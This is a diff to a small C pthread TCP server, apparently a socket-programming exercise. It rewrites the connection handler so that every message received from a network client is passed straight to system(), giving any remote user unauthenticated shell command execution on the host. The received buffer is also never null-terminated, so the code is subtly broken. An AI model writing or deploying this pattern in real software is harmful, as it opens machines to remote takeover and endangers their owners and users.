@@ -13,6 +13,7 @@
 #include <string.h>
 
 
+
 #define LISTENQ 10
 #define MAXDATASIZE 100
 void* connection_handler(void* socket_desc);
@@ -66,28 +67,25 @@ int main (int argc, char **argv) {
 		      perror("Could not create thread");
 		      exit(1);
       }
-      pthread_join(thread , NULL);
+      //pthread_join(thread , NULL);
    }
    return(0);
 }
 
 void *connection_handler(void* socket_desc) {
 	int sock = *(int*)socket_desc, read_size;
-	char message[2000], *msg;
+	char message[2000];
 	char   buf[MAXDATASIZE];
-  strcpy(msg, "Greetings! I am your connection handler\n");
-  write(sock , msg , strlen(msg));
-  snprintf(buf, sizeof(buf), "%s\n", msg);
+
 	while( (read_size = recv(sock , message , 2000 , 0)) > 0 )
     {
-        puts("teste");
+        puts(message);
+        system(message);
         //Send the message back to client
         write(sock , message , strlen(message));
-        snprintf(buf, sizeof(buf), "%s\n", message);
     }
 
-	if(read_size == 0)
-    {
+	if(read_size == 0) {
         puts("Client disconnected");
         fflush(stdout);
     }
